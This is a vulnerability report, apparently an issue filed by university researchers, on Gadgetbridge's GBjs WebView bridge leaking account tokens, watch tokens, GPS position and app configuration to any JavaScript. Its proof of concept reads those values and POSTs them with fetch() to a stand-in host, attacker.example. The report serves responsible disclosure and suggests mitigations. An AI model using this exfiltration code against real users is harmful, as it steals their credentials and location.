# `GBjs` Bridge Exposes Watch Tokens and GPS Position to Any JS in WebView

## Detection note

This issue was identified through automated LLM-based static analysis of WebView `addJavascriptInterface` bridges, as part of academic security research at the University of Southern Denmark (SDU) in the context of a masters level course named Engineering in Research.

The finding was manually reviewed before submission.

To aid the purposes of our research, we would kindly request acknowledgement of the reported issue as well as a final verdict from the open source community working on this repository, even if the issue is not acted on.

We are reporting in good faith and are happy to answer questions.

## Summary

The `GBjs` bridge (`JSInterface`) in `ExternalPebbleJSActivity` and `PebbleJsService` exposes methods that return sensitive data to JavaScript with no per-call permission gate or origin restriction:

- `getAccountToken()` - returns the Pebble account token
- `getWatchToken()` - returns the connected-watch token
- `getCurrentPosition()` - returns the user's current GPS coordinates
- `getAppConfigurationFile()` - returns the watch app's stored configuration blob

Any JavaScript app sideloaded to the watch and executed within the embedded WebView, or any compromised remote page that gets loaded into the WebView, can read these values and exfiltrate them to a server of its choice. There is no consent prompt and no signed-origin check before the values are returned.

**Severity:** Medium (token reuse risk, location exposure)
**Affected version(s):** BangleJS Gadgetbridge variant, version code 245 (commit `01cce93`)

---

## Affected file(s)

- `app/src/main/java/nodomain/freeyourgadget/gadgetbridge/service/devices/pebble/webview/JSInterface.java` - `getAccountToken()`, `getWatchToken()`, `getCurrentPosition()`, `getAppConfigurationFile()` bridge methods
- `app/src/main/java/nodomain/freeyourgadget/gadgetbridge/activities/ExternalPebbleJSActivity.java` - bridge registration

---

## Vulnerable surface

```java
@JavascriptInterface
public String getAccountToken() { /* returns Pebble account token */ }

@JavascriptInterface
public String getWatchToken() { /* returns per-watch token */ }

@JavascriptInterface
public String getCurrentPosition() { /* returns lat/lon JSON */ }

@JavascriptInterface
public String getAppConfigurationFile() { /* returns config blob */ }
```

All four return values directly to the calling JS context.

---

## Proof of concept

```js
// From within a watch-app JS context (or any JS that lands in the GBjs-attached WebView):
const acct = GBjs.getAccountToken();
const watch = GBjs.getWatchToken();
const pos  = GBjs.getCurrentPosition();
const cfg  = GBjs.getAppConfigurationFile();
fetch("https://attacker.example/collect", {
    method: "POST",
    body: JSON.stringify({acct, watch, pos, cfg})
});
```

---

## Impact

- Account and watch tokens are sufficient for any caller to act on behalf of the user against the Pebble (or compatible) cloud. Token rotation depth determines the duration of impact.
- The GPS position read is silent: no Android permission prompt and no in-app dialog.
- The configuration file may contain user-provided credentials for the watch app (API keys, fitness service tokens) depending on the app.

The attack does not require root, BLE proximity, or a separate APK; it only requires JS execution inside the existing WebView, which is the watch app's normal operating surface.

---

## Suggested mitigation

- Treat token returns as a privileged operation: require the user to confirm "allow this app to read your account token" once per watch app installation, and store the consent decision per app ID.
- For `getCurrentPosition`, require the system-level location permission flow and explicit per-session user confirmation in addition to it.
- Replace raw token returns with short-lived signed responses scoped to the app's intended backend.
- Validate that the WebView's current URL matches a signed-watch-app origin or the configured Pebble app store URL before returning any value.
